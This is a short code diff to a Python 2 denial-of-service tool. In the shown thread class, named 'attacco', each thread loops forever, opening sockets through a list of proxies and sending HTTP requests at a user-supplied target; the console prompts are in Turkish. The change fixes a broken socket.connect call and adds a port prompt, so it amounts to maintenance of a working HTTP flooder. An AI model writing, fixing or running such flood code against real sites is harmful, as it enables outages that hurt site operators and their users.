@@ -294,7 +294,7 @@ class attacco(threading.Thread):
         while 1:
             try:
                 a = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                a.connect((proxy[0], int(port), int(proxy[1])))
+                a.connect((proxy[0], int(proxy[1])))
                 a.send(httprequest)
                 try:
                     for i in xrange(3):
@@ -318,6 +318,7 @@ print (" ")
 
 url = raw_input("\033[93m [+] Hedef : \033[1m")
 in_file = open(raw_input("\033[94m [+] Proxy : \033[1m"),"r")
+port = input("\033[94m [+] Port : \033[1m")
 thread = input("\033[95m [+] Threads : \033[1m")
 print ("\033[0;31m [!] Programı Dudurmak Istıyorsanız CTRL + Z \033[1m")
 host_url = url.replace("http://", "").replace("https://", "").split('/')[0]
